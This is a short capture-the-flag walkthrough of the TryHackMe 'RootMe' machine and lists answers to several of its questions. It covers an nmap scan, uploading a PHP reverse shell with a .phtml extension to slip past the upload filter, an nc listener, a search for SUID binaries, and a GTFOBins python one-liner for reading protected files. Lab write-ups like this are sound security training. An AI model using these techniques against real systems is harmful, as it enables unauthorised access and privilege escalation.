RootMe | TryHackMe
==================
undermouse, 21.2.2021


# Preparation

```bash
export $IP=<machine_ip>
mkdir nmap
```

# First, let's get information about the target.
Command to scan with **nmap**:
```bash
nmap -sC -sV -oN nmap/init $IP
```

##  How many ports are open?
```
2
```

## Apache Version
```
2.4.29
```

## What's running on port 22?
```
ssh
```

## The name of the hidden directory (used gobuster to find it)
```
/panel/
````


# Getting a shell

## Setup and avoding backend file extention filters
I checked if it's a PHP site by going to `MACHINE_IP/index.php`, it was the same as without `index.php`, so it means it's a PHP site.  
I will use PHP reverse shell code and upload it on target.  
  
PHP is not allowed, tried `phtml` ext and it worked.  
  
Let's set up a listener:
```bash
nc -lnvvp 9999
```

I've gone to `/uploads/rs.phtml` to start PHP code.   
   
## Searching for user.txt
```bash
find / -name "user.txt" 2>/dev/null
```

Answer for 3rd step:
```
In file
```


# PrivEsc

## Search for files with SUID permission, which file is weird? 
I'll use this command:
```
find / -perm -4000 2>/dev/null
```

Answer:
```
/usr/bin/python
```

## Escalating with GTFOBins
I found this on `GTFOBins`

```bash
python -c 'print(open("file_to_read").read())'
```


## Root.txt
```
Find it yourself!
```



